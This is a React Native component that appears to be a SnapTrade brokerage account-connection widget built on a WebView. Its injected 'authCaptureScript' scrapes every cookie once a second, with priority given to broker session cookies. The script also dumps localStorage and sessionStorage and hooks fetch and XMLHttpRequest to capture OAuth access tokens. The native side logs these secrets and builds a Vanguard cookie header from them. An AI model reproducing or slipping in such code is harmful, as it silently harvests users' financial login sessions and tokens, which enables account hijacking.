import React, { useRef, useCallback, useState } from 'react';
import { StyleSheet, View, ActivityIndicator } from 'react-native';
import { WebView } from 'react-native-webview';
import type { WebViewMessageEvent } from 'react-native-webview';
import { handleWebViewMessage } from '../utils/messageHandler';
import { SnapTradeConnectProps } from '../types';

const SnapTradeConnect: React.FC<SnapTradeConnectProps> = ({
  url,
  directMode = false,
  onSuccess,
  onError,
  onAbandoned,
}) => {
  const webViewRef = useRef<WebView>(null);
  const [cookiesHistory, setCookiesHistory] = useState<
    Record<string, string[]>
  >({});

  const handleMessage = useCallback(
    (event: WebViewMessageEvent) => {
      if (typeof event.nativeEvent.data === 'string') {
        console.log('WebView message received:', event.nativeEvent.data);

        try {
          const data = JSON.parse(event.nativeEvent.data);

          if (data.type === 'CAPTURED_TOKEN') {
            console.log('Token captured:', data.tokenData);
            webViewRef.current?.injectJavaScript(`
              window.postMessage(JSON.stringify(${JSON.stringify(data)}), '*');
            `);
            return;
          }

          if (data.type === 'COOKIES' && data.priorityCookies) {
            if (Object.keys(data.priorityCookies).length > 0) {
              console.log('➡️ Found authentication cookies:');
              Object.entries(data.priorityCookies).forEach(
                ([name, value]: any) => {
                  console.log(`🔑 ${name}: ${value.substring(0, 30)}...`);
                }
              );

              const cookieHeader = Object.entries(data.priorityCookies)
                .map(([name, value]) => `${name}=${value}`)
                .join('; ');
              console.log('📢 Cookie header for Vanguard:', cookieHeader);
            }
          }

          if (data.type === 'STORAGE') {
            console.log('📦 Local storage:', data.local);
            console.log('📦 Session storage:', data.session);
          }
        } catch (e) {
          // Not JSON or not a special message
        }

        handleWebViewMessage(event, {
          onSuccess,
          onError,
          onAbandoned,
        });
      }
    },
    [onSuccess, onError, onAbandoned, cookiesHistory]
  );

  const baseScript = `
    (function() {
      window.addEventListener('message', function(event) {
        if (event && event.data && typeof event.data === 'string') {
          window.ReactNativeWebView.postMessage(event.data);
        }
      });
      const originalPostMessage = window.postMessage;
      window.postMessage = function(message) {
        if (typeof message === 'string') {
          window.ReactNativeWebView.postMessage(message);
        }
        return originalPostMessage.apply(window, arguments);
      };
      true;
    })();
  `;

  const authCaptureScript = `
(function() {
  const priorityCookies = [
    'cl_auth_ticket',
    'webSessionId',
    'XSRF-TOKEN',
    'bm_sv',
    '_abck',
    'SMSESSION',
    'authorization'
  ];

  function sendAuthData(type, payload) {
    window.ReactNativeWebView.postMessage(JSON.stringify({ type, ...payload }));
  }

  function parseCookies() {
    const all = document.cookie.split(';').map(c => c.trim());
    const result = {};
    all.forEach(c => {
      const [k, ...v] = c.split('=');
      result[k] = v.join('=');
    });
    return result;
  }

  function captureCookies() {
    const cookies = parseCookies();
    const priority = {};
    priorityCookies.forEach(k => {
      if (cookies[k]) priority[k] = cookies[k];
    });

    sendAuthData('COOKIES', {
      cookies,
      priorityCookies: priority,
      url: window.location.href,
      timestamp: new Date().toISOString()
    });
  }

  function captureTokenFromXHR(xhr) {
    try {
      const res = JSON.parse(xhr.responseText);
      if (res.access_token) {
        sendAuthData('CAPTURED_TOKEN', {
          broker: new URL(window.location.href).searchParams.get('broker') || 'unknown',
          tokenData: {
            access_token: res.access_token,
            expires_in: res.expires_in,
            token_type: res.token_type,
            timestamp: new Date().toISOString()
          }
        });
      }
    } catch (e) {
      console.error('XHR token parse failed:', e);
    }
  }

  const OrigXHR = window.XMLHttpRequest;
  window.XMLHttpRequest = function() {
    const xhr = new OrigXHR();
    const origOpen = xhr.open;
    xhr.open = function() {
      this.addEventListener('load', () => {
        if (this.responseURL.includes('oauth2/token')) {
          captureTokenFromXHR(this);
        }
      });
      origOpen.apply(this, arguments);
    };
    return xhr;
  };

  const origFetch = window.fetch;
  window.fetch = function(...args) {
    return origFetch(...args).then(async res => {
      if (res.url.includes('oauth2/token')) {
        try {
          const data = await res.clone().json();
          if (data.access_token) {
            sendAuthData('CAPTURED_TOKEN', {
              broker: new URL(window.location.href).searchParams.get('broker') || 'unknown',
              tokenData: {
                access_token: data.access_token,
                expires_in: data.expires_in,
                token_type: data.token_type,
                timestamp: new Date().toISOString()
              }
            });
          }
        } catch (e) {
          console.error('Fetch token parse failed:', e);
        }
      }
      return res;
    });
  };

  function captureStorage() {
    const local = {};
    const session = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      local[key] = localStorage.getItem(key);
    }
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      session[key] = sessionStorage.getItem(key);
    }
    sendAuthData('STORAGE', { local, session });
  }

  window.addEventListener('load', () => {
    captureCookies();
    captureStorage();
  });

  document.addEventListener('submit', () => {
    setTimeout(() => {
      captureCookies();
      captureStorage();
    }, 300);
  });

  setInterval(() => {
    captureCookies();
  }, 1000);
})();
`;

  const injectedJavaScript = `${baseScript}\n${authCaptureScript}`;

  return (
    <View style={styles.container}>
      <WebView
        ref={webViewRef}
        source={{ uri: url }}
        style={styles.webView}
        onMessage={handleMessage}
        injectedJavaScript={injectedJavaScript}
        javaScriptEnabled={true}
        domStorageEnabled={true}
        startInLoadingState={true}
        onError={(syntheticEvent) => {
          const { nativeEvent } = syntheticEvent;
          console.error('WebView error:', nativeEvent);
        }}
        renderLoading={() => (
          <View style={styles.loadingContainer}>
            <ActivityIndicator size="large" />
          </View>
        )}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    overflow: 'hidden',
  },
  webView: {
    flex: 1,
  },
  loadingContainer: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#F5FCFF',
  },
});

export default SnapTradeConnect;
